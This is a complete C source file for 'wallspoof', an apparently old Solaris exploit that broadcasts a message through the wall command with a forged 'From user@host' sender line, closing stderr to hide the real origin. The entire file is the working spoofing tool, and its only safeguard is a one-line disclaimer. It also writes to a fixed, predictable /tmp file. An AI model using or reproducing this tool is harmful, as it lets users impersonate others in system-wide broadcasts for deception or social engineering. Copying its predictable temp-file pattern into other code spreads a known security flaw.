/*
 wallspoof.c - SOLARIS (X86/SPARC) Exploit
 Don't use this in a malicious way! (i.e. to own people)
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
  char *userhost;
  char mesg[2050];
  FILE *tmp;
  if (argc < 2) {
    fprintf (stderr, "usage: wallspoof user@host\n");
    exit (-1);
  }
  userhost = argv[1];
  if ((tmp = fopen("/tmp/rxax", "w")) == NULL) {
    perror ("open");
    exit (-1);
  }
  printf ("Enter your message below.  End your message with an EOF (Control+D).\n");
  fprintf (tmp, "From %s:", userhost);
  while (fgets(mesg, 2050, stdin) != NULL)
    fprintf (tmp, "%s", mesg);
  fclose (tmp);
  fclose (stderr);
  printf ("<Done>\n");
  system ("/usr/sbin/wall < /tmp/rxax");
  unlink ("/tmp/rxax");
}
